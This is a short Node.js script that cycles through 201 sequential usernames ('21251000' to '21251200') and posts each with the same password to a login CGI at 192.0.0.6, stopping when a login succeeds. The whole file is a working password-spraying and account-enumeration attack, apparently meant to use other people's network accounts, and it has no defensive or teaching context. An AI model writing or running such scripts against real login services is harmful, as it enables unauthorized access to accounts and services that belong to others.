/**
 * XadillaX created at 2014-09-19 14:45:03
 *
 * Copyright (c) 2014 Huaban.com, all rights
 * reserved
 */
var spidex = require("spidex");

function login(id) {
    if(id > 200) {
        console.log("Logged failed with all accounts.");
        return;
    }

    var oldId = id;
    id = id.toString();
    while(id.length < 3) id = '0' + id;
    id = "21251" + id;

    spidex.post("http://192.0.0.6/cgi-bin/do_login", function(html, status) {
        console.log(id + ": " + html);

        if(/\d+/.test(html)) {
            console.log("Logged successfully with " + id + "!");
            return;
        }

        setTimeout(login, 100, oldId + 1);
    }, {
        username    : id,
        password    : "65da38ecd0b30a5a",
        drop        : 0,
        type        : 1,
        n           : 100
    }, "utf8");
}

setTimeout(login, 1, 0);

